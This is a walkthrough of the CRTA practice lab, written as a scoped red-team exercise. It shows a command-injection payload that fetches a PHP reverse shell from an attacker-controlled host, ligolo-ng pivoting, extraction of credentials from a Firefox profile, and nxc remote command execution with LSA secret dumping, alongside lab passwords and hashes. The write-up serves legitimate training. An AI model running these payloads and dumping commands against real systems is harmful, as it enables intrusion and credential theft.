Welcome to the CRTA Lab Writeup, this is the 30-day lab CyberWarfareLabs provide for you to practice for the CRTA exam, I'll treat this one lab as many CTFs I've done previously so if you haven't read any of my Writeups, I encourage you to do so, think of this lab as a red team engagement, we got a scope we must follow in this lab as we would in a real red team engagement, let's check the scope:

![Pasted image 20250919150856.png](../IMAGES/Pasted%20image%2020250919150856.png)

Knowing the scope, we can begin.

# PORT SCAN
---

Since we got a network, we must perform a live host discovery, we can use nmap for this task, let's make it simple using the `-sn` option:

```
nmap -sn --min-rate 5000 192.168.80.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-18 14:28 EDT
Nmap scan report for 192.168.80.10
Host is up (0.15s latency).
Nmap done: 256 IP addresses (1 host up) scanned in 1.62 seconds
```

We found `192.168.80.10`, let's scan the host now then:

| PORT | SERVICE |
| :--- | :------ |
| 22   | ssh     |
| 80   | http    |


# RECONNAISSANCE
---

So now we know we're facing a web application on this host, let's take a look at it:

![Pasted image 20250919150900.png](../IMAGES/Pasted%20image%2020250919150900.png)

This is an `E-commerce` web application, we can create accounts so let's do it:

![Pasted image 20250919150906.png](../IMAGES/Pasted%20image%2020250919150906.png)


```
testacc / testacc123
```


Once we login, we can see this:

![Pasted image 20250919150911.png](../IMAGES/Pasted%20image%2020250919150911.png)

We got some functionalities here such as a search bar, if we go to `career`, we can also see an upload functionality:

![Pasted image 20250919151008.png](../IMAGES/Pasted%20image%2020250919151008.png)

Let's test the search bar and the upload functionality, if we test for XSS on the search bar, we notice no reflection is made on the source code of the page:

![Pasted image 20250919151013.png](../IMAGES/Pasted%20image%2020250919151013.png)

So XSS may not be our way here, let's go with the upload functionality, if site isn't properly coded, it could accept other files such as `php` files which would get us RCE, let's test uploading a webshell:

![Pasted image 20250919151016.png](../IMAGES/Pasted%20image%2020250919151016.png)

![Pasted image 20250919151021.png](../IMAGES/Pasted%20image%2020250919151021.png)

We need to upload `.zip`, `.pdf` or `.docx` files, knowing that it accepts `.zip` files, we could try the `zip polyglot` technique, I used this technique back on a HacktheBox machine, let's take a look at it:

![Pasted image 20250919151027.png](../IMAGES/Pasted%20image%2020250919151027.png)

But, before we even try this, let's create a simple zip file and check how the app behaves when uploading this file:

```
echo 'TEST' > test.txt
zip benign.zip test.txt
```

If we try uploading the file, we get an error:

![Pasted image 20250919151032.png](../IMAGES/Pasted%20image%2020250919151032.png)

We get `Failed to Upload File`, trying to upload a `docx` or `.pdf` file brings up the same alert:

![Pasted image 20250919151037.png](../IMAGES/Pasted%20image%2020250919151037.png)


![Pasted image 20250919151041.png](../IMAGES/Pasted%20image%2020250919151041.png)


So it seems like the upload functionality is broken, this isn't our way in, what can we do then?

Let's fuzz, we were too centered on the first functionalities we forgot to fuzz:

```BASH
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u 'http://192.168.80.10/FUZZ' -ic -c -t 200 -e .php,.html,.js,.git,.json,.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.80.10/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
 :: Extensions       : .php .html .js .git .json .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.php                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 179ms]
.html                   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 325ms]
index.php               [Status: 200, Size: 4249, Words: 1890, Lines: 100, Duration: 2331ms]
assets                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 149ms]
registration.php        [Status: 200, Size: 3823, Words: 1667, Lines: 86, Duration: 157ms]
report.php              [Status: 302, Size: 11107, Words: 795, Lines: 386, Duration: 152ms]
add.php                 [Status: 302, Size: 13412, Words: 2080, Lines: 429, Duration: 149ms]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 152ms]
search.php              [Status: 200, Size: 444, Words: 42, Lines: 27, Duration: 167ms]
down.php                [Status: 200, Size: 326, Words: 37, Lines: 25, Duration: 154ms]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 148ms]
os.php                  [Status: 200, Size: 727, Words: 46, Lines: 31, Duration: 160ms]
career.php              [Status: 302, Size: 13175, Words: 1005, Lines: 424, Duration: 168ms]
logout.php              [Status: 302, Size: 1, Words: 1, Lines: 2, Duration: 148ms]
config.php              [Status: 200, Size: 2, Words: 3, Lines: 1, Duration: 167ms]
fonts                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 161ms]
```

We found some files, for example the `os.php` one seems weird, let's check it up:

![Pasted image 20250919151047.png](../IMAGES/Pasted%20image%2020250919151047.png)

If we enter our email and subscribe, we notice a new URL format is created:

![Pasted image 20250919151050.png](../IMAGES/Pasted%20image%2020250919151050.png)


The URL goes in the format of `os.php?EMAIL=email`, if this isn't properly sanitized, we could test some stuff such as SSTI, SSRF, XSS, SQLI or even command injection, let's test these stuff:

![Pasted image 20250919151054.png](../IMAGES/Pasted%20image%2020250919151054.png)

![Pasted image 20250919151137.png](../IMAGES/Pasted%20image%2020250919151137.png)

![Pasted image 20250919151141.png](../IMAGES/Pasted%20image%2020250919151141.png)

![Pasted image 20250919151147.png](../IMAGES/Pasted%20image%2020250919151147.png)

OS command injection works here, seems like the endpoint isn't properly encoded at all, we can even exploit this without using pipes `|`:

![Pasted image 20250919151151.png](../IMAGES/Pasted%20image%2020250919151151.png)

Since this endpoint is some kind of simulation of the `subscribe to the newsletter` functionality on the main page, we could check if the OS command injection exists there too:

![Pasted image 20250919151154.png](../IMAGES/Pasted%20image%2020250919151154.png)

To be honest, I don't know if the `os.php` endpoint is one created by users on the lab or is intended by `CyberWarfareLabs`, I will proceed believing that the endpoint is created by users so the exploit on the main page should be the intended way, let's proceed to exploitation.


# EXPLOITATION
---

We know we got OS command injection, we can send ourselves a reverse shell in the following way, host a reverse shell on your host machine, it can be the one from `PentestMonkey`, now we will abuse the command injection to download our file using curl and place it on the web application so we can access it:

```
EMAIL=curl+http://CHANGE_WITH_YOUR_IP:8000/shell.php+-O+shell.php
```

If we check our python server, we're able to see the server downloaded our file:

![Pasted image 20250919151159.png](../IMAGES/Pasted%20image%2020250919151159.png)

Our reverse shell file should now be available at:

```
http://192.168.80.10/shell.php
```

Set up a listener and access that URL, you should see a connection being made to your machine:

![Pasted image 20250919151203.png](../IMAGES/Pasted%20image%2020250919151203.png)


# PIVOTING AND PRIVILEGE ESCALATION
---

Time to start our pivoting, checking another interfaces showcase an `ens34` interface:

![Pasted image 20250919151209.png](../IMAGES/Pasted%20image%2020250919151209.png)

We can also find this information by running linpeas:

![Pasted image 20250919151213.png](../IMAGES/Pasted%20image%2020250919151213.png)

We found the credentials for `privilege`, let's switch to ssh then:

```
privilege / Admin@962
```

![Pasted image 20250919151216.png](../IMAGES/Pasted%20image%2020250919151216.png)

Let's find live hosts on this interface, we can use the following bash command for it:

```bash
for ip in {1..254}; do 
    (ping -c 1 -W 1 192.168.98.$ip | grep "bytes from" | cut -d " " -f 4 | cut -d ":" -f 1) &
done | grep -v '^\[.*\]$'
```

Once we use the command, we get the following:

```
www-data@ubuntu-virtual-machine:/tmp$ for ip in {1..254}; do 
>     (ping -c 1 -W 1 192.168.98.$ip | grep "bytes from" | cut -d " " -f 4 | cut -d ":" -f 1) &
> done | grep -v '^\[.*\]$'
192.168.98.2
192.168.98.15
192.168.98.30
192.168.98.120
```

This is where the real fun begins, we will use `ligolo` to pivot the entire network, let's do the following, I'll use an example from the `fullhouse` prolab on hackthebox in which I did the same:

![Pasted image 20250919151221.png](../IMAGES/Pasted%20image%2020250919151221.png)

So, let's do the same, first of all, make sure to get the agent so we can use it on the reverse shell session:

https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8.2

Once you got the agent, we need to upload it onto the machine, host a python server and use curl or wget:

```
wget http://IP:8000/agent
```

Now, before we use the agent, we need to set up our proxy, do the following:

```
ligolo-proxy -selfcert -laddr 0.0.0.0:11601
```

Make sure to create a new TUN interface named ligolo before starting the proxy, you need to do this:

```
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 192.168.98.0/24 dev ligolo
```

But on here, we need to modify the procedure a little bit, if we do the last step, we get:

```
sudo ip route add 192.168.98.0/24 dev ligolo
RTNETLINK answers: File exists
```

That's because the kernel already has a route for the network, let's find where:

```
sudo ip route show 192.168.98.0/24 

192.168.98.0/24 via 10.10.200.1 dev tun0
```

`tun0`, we need to delete the existing route in order to be able to use it on our pivot interface, let's do it:

```
sudo ip route del 192.168.98.0/24 via 10.10.200.1 dev tun0
```

Now rerun the same last command:

```
sudo ip route add 192.168.98.0/24 dev ligolo
```

Now it's time to use the agent:

```
./agent -connect 10.10.200.176:11601 -ignore-cert
```

Once the connection is made, make sure to do this inside the proxy to start the tunnel:

```
session
# Once prompted, choose 1
start
```

![Pasted image 20250919151233.png](../IMAGES/Pasted%20image%2020250919151233.png)

![Pasted image 20250919151236.png](../IMAGES/Pasted%20image%2020250919151236.png)

Ok, we got our tunnel, let's ping one of the live hosts we found:

![Pasted image 20250919151240.png](../IMAGES/Pasted%20image%2020250919151240.png)

Nice, we have internet connection, let's use rustscan or nmap to find open services on each host we found, let's do it:

```
nmap -sC -sV --min-rate 5000 -Pn -p- -iL hosts.txt -vvv
```

**192.168.98.2**

| PORT      | SERVICE       |
| --------- | ------------- |
| 53/tcp    | domain        |
| 88/tcp    | kerberos-sec  |
| 135/tcp   | msrpc         |
| 139/tcp   | netbios-ssn   |
| 389/tcp   | ldap          |
| 445/tcp   | microsoft-ds? |
| 464/tcp   | kpasswd5?     |
| 593/tcp   | ncacn_http    |
| 636/tcp   | tcpwrapped    |
| 3268/tcp  | ldap          |
| 3269/tcp  | tcpwrapped    |
| 5357/tcp  | http          |
| 5985/tcp  | http          |
| 9389/tcp  | mc-nmf        |
| 47001/tcp | http          |
| 49664/tcp | msrpc         |
| 49665/tcp | msrpc         |
| 49666/tcp | msrpc         |
| 49667/tcp | msrpc         |
| 49671/tcp | msrpc         |
| 49678/tcp | ncacn_http    |
| 49679/tcp | msrpc         |
| 49682/tcp | msrpc         |
| 49683/tcp | msrpc         |
| 49688/tcp | msrpc         |
| 49706/tcp | msrpc         |
| 49779/tcp | msrpc         |

**192.168.98.15**

| PORT   | SERVICE |
| ------ | ------- |
| 22/tcp | ssh     |
| 80/tcp | http    |

**192.168.98.30**

| PORT      | SERVICE       |
| :-------- | :------------ |
| 135/tcp   | msrpc         |
| 139/tcp   | netbios-ssn   |
| 445/tcp   | microsoft-ds? |
| 5357/tcp  | http          |
| 5985/tcp  | http          |
| 47001/tcp | http          |
| 49664/tcp | msrpc         |
| 49665/tcp | msrpc         |
| 49666/tcp | msrpc         |
| 49667/tcp | msrpc         |
| 49668/tcp | msrpc         |
| 49669/tcp | msrpc         |
| 49670/tcp | msrpc         |
| 49671/tcp | msrpc         |
| 51390/tcp | msrpc         |

**192.168.98.120**

| PORT      | SERVICE       |
| :-------- | :------------ |
| 53/tcp    | domain        |
| 88/tcp    | kerberos-sec  |
| 135/tcp   | msrpc         |
| 139/tcp   | netbios-ssn   |
| 389/tcp   | ldap          |
| 445/tcp   | microsoft-ds? |
| 464/tcp   | kpasswd5?     |
| 593/tcp   | ncacn_http    |
| 636/tcp   | tcpwrapped    |
| 3268/tcp  | ldap          |
| 3269/tcp  | tcpwrapped    |
| 5985/tcp  | http          |
| 9389/tcp  | mc-nmf        |
| 47001/tcp | http          |
| 49664/tcp | msrpc         |
| 49665/tcp | msrpc         |
| 49666/tcp | msrpc         |
| 49667/tcp | msrpc         |
| 49671/tcp | msrpc         |
| 49676/tcp | ncacn_http    |
| 49677/tcp | msrpc         |
| 49684/tcp | msrpc         |
| 49685/tcp | msrpc         |
| 49690/tcp | msrpc         |
| 49718/tcp | msrpc         |
| 56762/tcp | msrpc         |
| 60293/tcp | msrpc         |

`192.168.98.15` is the machine we already pwned so no need to focus on it for now, we'll only go back to our ssh session in case we missed something, let's check the other hosts, for example the `192.168.98.2` machine which seems to be the domain controller, got the port `5357` open hosting a web application, let's check:

![Pasted image 20250919151249.png](../IMAGES/Pasted%20image%2020250919151249.png)

It says service unavailable, the one at `.30` contains the same web application, let's check if we can access it:

![Pasted image 20250919151252.png](../IMAGES/Pasted%20image%2020250919151252.png)

Same as the other one, let's keep digging, we can see `smb` enabled on all the hosts but anonymous login doesn't work on any host, what can we do then, what are we missing?

If we recall correctly, we only ran linpeas on the reverse shell but not on the ssh session, since we switched users, it could be worth to run the scan again and check if we missed anything:

![Pasted image 20250919151307.png](../IMAGES/Pasted%20image%2020250919151307.png)

Some new `.sqlite` files can be found inside of the Mozilla Firefox directory, this didn't appear on the previous scan due to this directory being exclusive to the `privilege` user, let's check these files and check if some credentials can be found here:

```bash
privilege@ubuntu-virtual-machine:~/.mozilla/firefox/b2rri1qd.default-release$ ls -la
total 16292
drwx------ 14 privilege privilege    4096 Sep 18 22:00 .
drwx------  6 privilege privilege    4096 Sep 10 18:11 ..
-rw-rw-r--  1 privilege privilege      24 Jan 19  2025 addons.json
-rw-rw-r--  1 privilege privilege    6660 Jan 17  2025 addonStartup.json.lz4
-rwxrwxr-x  1 privilege privilege 4501504 Sep 11 03:32 agent
-rw-rw-r--  1 privilege privilege       0 Jan 19  2025 AlternateServices.txt
drwxr-xr-x  2 privilege privilege    4096 Jan 17  2025 bookmarkbackups
-rw-rw-r--  1 privilege privilege     216 Jan 17  2025 broadcast-listeners.json
drwx------  3 privilege privilege    4096 Jan 16  2025 browser-extension-data
-rw-------  1 privilege privilege  229376 Jan 16  2025 cert9.db
-rw-------  1 privilege privilege     161 Jan 16  2025 compatibility.ini
-rw-rw-r--  1 privilege privilege     939 Jan 16  2025 containers.json
-rw-r--r--  1 privilege privilege  229376 Jan 16  2025 content-prefs.sqlite
-rw-r--r--  1 privilege privilege   98304 Jan 16  2025 cookies.sqlite
drwx------  3 privilege privilege    4096 Jan 17  2025 crashes
-rw-r--r--  1 privilege privilege   98304 Jan 16  2025 credentialstate.sqlite
drwxr-xr-x  4 privilege privilege    4096 Jan 19  2025 datareporting
-rw-rw-r--  1 privilege privilege     633 Jan 16  2025 ExperimentStoreData.json
-rw-rw-r--  1 privilege privilege     985 Jan 16  2025 extension-preferences.json
-rw-rw-r--  1 privilege privilege   41280 Jan 19  2025 extensions.json
drwxr-xr-x  2 privilege privilege    4096 Jan 16  2025 extension-store
-rw-r--r--  1 privilege privilege 5242880 Jan 16  2025 favicons.sqlite
-rw-r--r--  1 privilege privilege  262144 Jan 17  2025 formhistory.sqlite
drwxr-xr-x  3 privilege privilege    4096 Jan 17  2025 gmp-gmpopenh264
-rw-rw-r--  1 privilege privilege     410 Jan 16  2025 handlers.json
-rw-------  1 privilege privilege  294912 Jan 16  2025 key4.db
lrwxrwxrwx  1 privilege privilege      16 Jan 17  2025 lock -> 127.0.1.1:+25657
drwx------  2 privilege privilege    4096 Jan 16  2025 minidumps
-rw-rw-r--  1 privilege privilege       0 Jan 17  2025 .parentlock
-rw-r--r--  1 privilege privilege   98304 Jan 17  2025 permissions.sqlite
-rw-------  1 privilege privilege     481 Jan 16  2025 pkcs11.txt
-rw-r--r--  1 privilege privilege 5242880 Jan 19  2025 places.sqlite
-rw-r--r--  1 privilege privilege   32768 Sep 18 22:00 places.sqlite-shm
-rw-r--r--  1 privilege privilege       0 Sep 18 22:00 places.sqlite-wal
-rw-------  1 privilege privilege   11986 Jan 19  2025 prefs.js
-rw-r--r--  1 privilege privilege   65536 Jan 17  2025 protections.sqlite
drwx------  2 privilege privilege    4096 Jan 19  2025 saved-telemetry-pings
-rw-rw-r--  1 privilege privilege     371 Jan 16  2025 search.json.mozlz4
drwxrwxr-x  2 privilege privilege    4096 Jan 16  2025 security_state
-rw-rw-r--  1 privilege privilege     288 Jan 19  2025 sessionCheckpoints.json
drwxr-xr-x  2 privilege privilege    4096 Jan 19  2025 sessionstore-backups
-rw-rw-r--  1 privilege privilege     566 Jan 19  2025 sessionstore.jsonlz4
drwxr-xr-x  2 privilege privilege    4096 Jan 17  2025 settings
-rw-rw-r--  1 privilege privilege      18 Jan 16  2025 shield-preference-experiments.json
-rw-rw-r--  1 privilege privilege     907 Jan 17  2025 SiteSecurityServiceState.txt
drwxr-xr-x  6 privilege privilege    4096 Jan 16  2025 storage
-rw-r--r--  1 privilege privilege    4096 Jan 19  2025 storage.sqlite
-rwx------  1 privilege privilege      50 Jan 16  2025 times.json
-rw-r--r--  1 privilege privilege   98304 Jan 16  2025 webappsstore.sqlite
-rw-rw-r--  1 privilege privilege     634 Jan 19  2025 xulstore.json
```

We can find a lot of files, checking the internet to understand the structure of the files here, we learn `places.sqlite` is the SQLite database file that Firefox uses to store our browsing history, bookmarks and download history, I decided to check that file and found this:

```
privilege@ubuntu-virtual-machine:~/.mozilla/firefox/b2rri1qd.default-release$ sqlite3 places.sqlite 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
moz_anno_attributes                 moz_keywords                      
moz_annos                           moz_meta                          
moz_bookmarks                       moz_origins                       
moz_bookmarks_deleted               moz_places                        
moz_historyvisits                   moz_places_metadata               
moz_inputhistory                    moz_places_metadata_search_queries
moz_items_annos                     moz_previews_tombstones           
sqlite> select * from moz_bookmarks;
1|2||0|0||||1737028376389000|1737028407427000|root________|1|1
2|2||1|0|menu|||1737028376389000|1737028376683000|menu________|1|3
3|2||1|1|toolbar|||1737028376389000|1737028376773000|toolbar_____|1|3
4|2||1|2|tags|||1737028376389000|1737028376389000|tags________|1|1
5|2||1|3|unfiled|||1737028376389000|1737028407427000|unfiled_____|1|3
6|2||1|4|mobile|||1737028376397000|1737028376662000|mobile______|1|2
7|2||2|0|Mozilla Firefox|||1737028376683000|1737028376683000|2hqCSTYguEKz|0|1
8|1|3|7|0|Get Help|||1737028376683000|1737028376683000|w8bhWWymMHw6|0|1
9|1|4|7|1|Customize Firefox|||1737028376683000|1737028376683000|uctFzas86dQw|0|1
10|1|5|7|2|Get Involved|||1737028376683000|1737028376683000|z-X79YDQmgEh|0|1
11|1|6|7|3|About Us|||1737028376683000|1737028376683000|GeWYCw2g0FLJ|0|1
12|2||2|1|Ubuntu and Free Software links|||1737028376683000|1737028376683000|MxAMPgqX16gZ|0|1
13|1|7|12|0|Ubuntu|||1737028376683000|1737028376683000|QqE4CH5UIHOL|0|1
14|1|8|12|1|Ubuntu Wiki (community-edited website)|||1737028376683000|1737028376683000|nbf_eTKjwhpv|0|1
15|1|9|12|2|Make a Support Request to the Ubuntu Community|||1737028376683000|1737028376683000|ukdJ8dcfVTPm|0|1
16|1|10|12|3|Debian (Ubuntu is based on Debian)|||1737028376683000|1737028376683000|xgQMK5g3l2Zp|0|1
17|1|11|3|0|Getting Started|||1737028376773000|1737028376773000|Kt6IQ_eV70GT|0|1
18|1|16|5|0|http://192.168.98.30/admin/index.php?user=john@child.warfare.corp&pass=User1@#$%6|||1737028407427000|1737029666390000|tuXr2pTr03P2|1|7
```

We find some credentials here, I decided to check this one because none of the other ones brought something important, let's test these credentials at smb on all of our hosts:

```
john / User1@#$%6
```

```bash
nxc smb hosts.txt -u 'john' -p 'User1@#$%6' --shares
SMB         192.168.98.2    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:warfare.corp) (signing:True) (SMBv1:False)
SMB         192.168.98.30   445    MGMT             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MGMT) (domain:child.warfare.corp) (signing:False) (SMBv1:False)
SMB         192.168.98.2    445    DC01             [-] warfare.corp\john:User1@#$%6 STATUS_LOGON_FAILURE
SMB         192.168.98.120  445    CDC              [*] Windows 10 / Server 2019 Build 17763 x64 (name:CDC) (domain:child.warfare.corp) (signing:True) (SMBv1:False)
SMB         192.168.98.30   445    MGMT             [+] child.warfare.corp\john:User1@#$%6 (../IMAGES/Pwn3d!)
SMB         192.168.98.120  445    CDC              [+] child.warfare.corp\john:User1@#$%6 
SMB         192.168.98.120  445    CDC              [*] Enumerated shares
SMB         192.168.98.120  445    CDC              Share           Permissions     Remark
SMB         192.168.98.120  445    CDC              -----           -----------     ------
SMB         192.168.98.120  445    CDC              ADMIN$                          Remote Admin
SMB         192.168.98.120  445    CDC              C$                              Default share
SMB         192.168.98.120  445    CDC              IPC$            READ            Remote IPC
SMB         192.168.98.120  445    CDC              NETLOGON        READ            Logon server share 
SMB         192.168.98.120  445    CDC              SYSVOL          READ            Logon server share 
SMB         192.168.98.30   445    MGMT             [*] Enumerated shares
SMB         192.168.98.30   445    MGMT             Share           Permissions     Remark
SMB         192.168.98.30   445    MGMT             -----           -----------     ------
SMB         192.168.98.30   445    MGMT             ADMIN$          READ,WRITE      Remote Admin
SMB         192.168.98.30   445    MGMT             C$              READ,WRITE      Default share
SMB         192.168.98.30   445    MGMT             IPC$            READ            Remote IPC
```

![Pasted image 20250919151326.png](../IMAGES/Pasted%20image%2020250919151326.png)

The `(../IMAGES/Pwn3d!)` message on `192.168.98.30` is huge for us, it means this user has  administrative level access to the host, we can confirm this by running the `whoami /all` command using `nxc` on the host with this credentials:

```bash
nxc smb 192.168.98.30 -u 'john' -p 'User1@#$%6' -x "whoami /all"
SMB         192.168.98.30   445    MGMT             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MGMT) (domain:child.warfare.corp) (signing:False) (SMBv1:False) 
SMB         192.168.98.30   445    MGMT             [+] child.warfare.corp\john:User1@#$%6 (../IMAGES/Pwn3d!)
SMB         192.168.98.30   445    MGMT             [+] Executed command via wmiexec
SMB         192.168.98.30   445    MGMT             USER INFORMATION
SMB         192.168.98.30   445    MGMT             ----------------
SMB         192.168.98.30   445    MGMT             User Name  SID
SMB         192.168.98.30   445    MGMT             ========== ============================================
SMB         192.168.98.30   445    MGMT             child\john S-1-5-21-3754860944-83624914-1883974761-1104
SMB         192.168.98.30   445    MGMT             GROUP INFORMATION
SMB         192.168.98.30   445    MGMT             -----------------
SMB         192.168.98.30   445    MGMT             Group Name                           Type             SID          Attributes
SMB         192.168.98.30   445    MGMT             ==================================== ================ ============ ===============================================================
SMB         192.168.98.30   445    MGMT             Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
SMB         192.168.98.30   445    MGMT             BUILTIN\Administrators               Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
SMB         192.168.98.30   445    MGMT             BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
SMB         192.168.98.30   445    MGMT             NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
SMB         192.168.98.30   445    MGMT             NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
SMB         192.168.98.30   445    MGMT             NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
SMB         192.168.98.30   445    MGMT             NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
SMB         192.168.98.30   445    MGMT             Mandatory Label\High Mandatory Level Label            S-1-16-12288
SMB         192.168.98.30   445    MGMT             PRIVILEGES INFORMATION
SMB         192.168.98.30   445    MGMT             ----------------------
SMB         192.168.98.30   445    MGMT             Privilege Name                            Description                                                        State
SMB         192.168.98.30   445    MGMT             ========================================= ================================================================== =======
SMB         192.168.98.30   445    MGMT             SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SMB         192.168.98.30   445    MGMT             SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SMB         192.168.98.30   445    MGMT             SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SMB         192.168.98.30   445    MGMT             SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SMB         192.168.98.30   445    MGMT             SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SMB         192.168.98.30   445    MGMT             SeSystemtimePrivilege                     Change the system time                                             Enabled
SMB         192.168.98.30   445    MGMT             SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SMB         192.168.98.30   445    MGMT             SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SMB         192.168.98.30   445    MGMT             SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SMB         192.168.98.30   445    MGMT             SeBackupPrivilege                         Back up files and directories                                      Enabled
SMB         192.168.98.30   445    MGMT             SeRestorePrivilege                        Restore files and directories                                      Enabled
SMB         192.168.98.30   445    MGMT             SeShutdownPrivilege                       Shut down the system                                               Enabled
SMB         192.168.98.30   445    MGMT             SeDebugPrivilege                          Debug programs                                                     Enabled
SMB         192.168.98.30   445    MGMT             SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SMB         192.168.98.30   445    MGMT             SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SMB         192.168.98.30   445    MGMT             SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SMB         192.168.98.30   445    MGMT             SeUndockPrivilege                         Remove computer from docking station                               Enabled
SMB         192.168.98.30   445    MGMT             SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SMB         192.168.98.30   445    MGMT             SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SMB         192.168.98.30   445    MGMT             SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SMB         192.168.98.30   445    MGMT             SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SMB         192.168.98.30   445    MGMT             SeTimeZonePrivilege                       Change the time zone                                               Enabled
SMB         192.168.98.30   445    MGMT             SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SMB         192.168.98.30   445    MGMT             SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
SMB         192.168.98.30   445    MGMT             USER CLAIMS INFORMATION
SMB         192.168.98.30   445    MGMT             -----------------------
SMB         192.168.98.30   445    MGMT             User claims unknown.
SMB         192.168.98.30   445    MGMT             Kerberos support for Dynamic Access Control on this device has been disabled.
```

![Pasted image 20250919151335.png](../IMAGES/Pasted%20image%2020250919151335.png)

On here we can do everything on the host, we can dump the SAM for the local machine but that would be useless since we need to pivot to other hosts, let's do another thing, we can dump the LSASecrets which may contain service account passwords, we can use nxc for this task too, check the following article for more info on this technique:

https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/credential-dumping/lsa-secrets

![Pasted image 20250919151339.png](../IMAGES/Pasted%20image%2020250919151339.png)

Let's reproduce it then:

```bash
nxc smb 192.168.98.30 -u 'john' -p 'User1@#$%6' --lsa
SMB         192.168.98.30   445    MGMT             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MGMT) (domain:child.warfare.corp) (signing:False) (SMBv1:False) 
SMB         192.168.98.30   445    MGMT             [+] child.warfare.corp\john:User1@#$%6 (../IMAGES/Pwn3d!)
SMB         192.168.98.30   445    MGMT             [+] Dumping LSA secrets
SMB         192.168.98.30   445    MGMT             CHILD.WARFARE.CORP/john:$DCC2$10240#john#9855312d42ee254a7334845613120e61: (2025-01-17 14:47:56)
SMB         192.168.98.30   445    MGMT             CHILD.WARFARE.CORP/corpmngr:$DCC2$10240#corpmngr#7fd50bbab99e8ea7ae9c1899f6dea7c6: (2025-03-26 13:20:52)
SMB         192.168.98.30   445    MGMT             CHILD\MGMT$:aes256-cts-hmac-sha1-96:344c70047ade222c4ab35694d4e3e36de556692f02ec32fa54d3160f36246eec
SMB         192.168.98.30   445    MGMT             CHILD\MGMT$:aes128-cts-hmac-sha1-96:aa5b3d84614911fe611eafbda613baaf
SMB         192.168.98.30   445    MGMT             CHILD\MGMT$:des-cbc-md5:6402e0c20b89d386
SMB         192.168.98.30   445    MGMT             CHILD\MGMT$:plain_password_hex:4f005d003b006f0074005d003500760067002f0032007a0046004e0020004d00700023003600570031005000770041002600700055003d005a0047006100370033003e003b0032004600410059002a006b0046004400410069003e00530066006a0033006e0061007a004e0060003300590063005e0048006c005c0053003e003e0033003c007300500043007a002500300031004b00610060002000540033007a003f004200580048002f0068006d0052006f0027005b00520061003b003a0075002b0050004a005d006b003c006d004c00730045005d005b0074006c004b00760045005c00280059003a0066002000
SMB         192.168.98.30   445    MGMT             CHILD\MGMT$:aad3b435b51404eeaad3b435b51404ee:0f5fe480dd7eaf1d59a401a4f268b563:::
SMB         192.168.98.30   445    MGMT             dpapi_machinekey:0x34e3cc87e11d51028ffb38c60b0afe35d197627d
dpapi_userkey:0xb890e07ba0d31e31c758d305c2a29e1b4ea813a5
SMB         192.168.98.30   445    MGMT             corpmngr@child.warfare.corp:User4&*&*
```

We found credentials for `corpmngr`, let's do the same as before and test these on the different hosts we got:

```
corpmngr / User4&*&*
```

```bash
nxc smb hosts.txt -u 'corpmngr' -p 'User4&*&*'
SMB         192.168.98.30   445    MGMT             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MGMT) (domain:child.warfare.corp) (signing:False) (SMBv1:False) 
SMB         192.168.98.2    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:warfare.corp) (signing:True) (SMBv1:False) 
